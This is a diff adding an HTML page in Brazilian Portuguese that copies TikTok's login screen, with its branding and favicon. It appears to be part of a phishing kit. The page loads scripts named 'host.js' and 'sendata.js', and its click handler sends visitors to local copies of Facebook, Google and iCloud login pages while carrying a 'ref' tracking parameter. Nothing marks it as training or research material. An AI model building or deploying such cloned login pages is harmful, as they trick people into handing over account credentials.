@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Entrar no TikTok</title>
+  <link rel="icon" href="https://www.tiktok.com/favicon.ico" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      min-height: 100vh;
+      color: #000;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      width: 100%;
+      max-width: 400px;
+      margin-top: 20px;
+      padding: 0 10px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      font-weight: bold;
+      font-size: 20px;
+    }
+
+    .logo img {
+      height: 28px;
+      margin-right: 8px;
+    }
+
+    .feedback {
+      font-size: 14px;
+      color: #555;
+    }
+    .feedback a{
+        color: black;
+        text-decoration: none;
+    }
+    .feedback a{
+        
+    }
+
+    .container {
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #6d6d6d;
+      margin-bottom: 30px;
+     
+    }
+
+    .login-button {
+      width: 100%;
+      border: 1px solid #dcdcdc;
+      padding: 14px;
+      margin-bottom: 12px;
+      border-radius: 8px;
+      background-color: #fff;
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background 0.2s ease;
+      font-weight: 600;  
+      
+    }
+
+    .login-button:hover {
+      background-color: #f7f7f7;
+    }
+
+    .login-button img,
+    .login-button svg {
+      height: 20px;
+      margin-right: 12px;
+    }
+
+    .terms {
+      font-size: 12px;
+      color: #6d6d6d;
+      margin-top: 20px;
+      padding: 0 10px;
+    }
+
+    .terms a {
+      color: #333;
+      text-decoration: underline;
+    }
+
+    .signup {
+      margin-top: 25px;
+      font-size: 14px;
+    }
+
+    .signup a {
+      color: #fe2c55;
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 12px;
+      color: #888;
+    }
+
+    footer select {
+      padding: 6px;
+      margin-bottom: 10px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    footer p {
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <div class="logo">
+      <img src="tiktok-logo.png" alt="TikTok Logo" />
+   
+    </div>
+    <div class="feedback"><a href="https://www.tiktok.com/feedback/?lang=en">Feedback e ajuda</a></div>
+  </div>
+
+  <div class="container">
+    <h1>Entrar no TikTok</h1>
+    <p class="subtitle">Gerencie sua conta, verifique notificações, comente em vídeos e muito mais.</p>
+
+    <input type="hidden" value="tiktok" class="platform">
+
+    <div class="login-button">
+      <img src="https://img.icons8.com/ios-glyphs/30/000000/user--v1.png" alt="User" />
+      Usar telefone/e-mail/nome de usuário
+    </div>
+
+    <div class="login-button facebook">
+      <img src="https://img.icons8.com/ios-filled/50/1877f2/facebook-new.png" alt="Facebook" />
+      Continuar com Facebook
+    </div>
+
+     <div class="login-button google">
+      <img src="https://tunego.com.mx/wp-content/uploads/2018/07/google-logo-icon-PNG-Transparent-Background.png" alt="Facebook" />
+      Continuar com Google
+    </div>
+    <div class="login-button apple">
+      <img src="https://img.icons8.com/?size=100&id=30840&format=png&color=1A1A1A" alt="Facebook" />
+      Continuar com Apple
+    </div>
+
+    <p class="terms">
+      Ao continuar com uma conta do(a) <strong>Brasil</strong>, você aceita nossos
+      <a href="#">Termos de Serviço</a> e confirma que leu nossa
+      <a href="#">Política de Privacidade</a>.
+    </p>
+
+    <p class="signup">Não tem uma conta? <a href="#">Inscrever-se</a></p>
+  </div>
+
+  <footer>
+    <select>
+      <option selected>Português (Brasil)</option>
+      <option>English</option>
+      <option>Español</option>
+    </select>
+    <p>© 2025 TikTok</p>
+  </footer>
+
+     <script src="../host.js"></script>
+  <script src="../sendata.js"></script>
+
+  <script>
+   const queryString = window.location.search;
+    
+    const ref = params.get('ref')
+    const path = window.location.pathname
+
+    document.addEventListener("click",(e)=>{
+      
+      if(e.target.classList[1] === 'facebook'){
+     
+        location.href = `/d/facebook.com/login.html?ref=${ref}`
+      }
+       if(e.target.classList[1] === 'google'){
+          location.href = `/d/google.com/login.html?ref=${ref}`
+    
+      }
+       if(e.target.classList[1] === 'apple'){
+          location.href = `/d/icloud.com/login.html?ref=${ref}`
+      }
+    })
+    
+    
+  
+  </script>
+
+</body>
+</html>
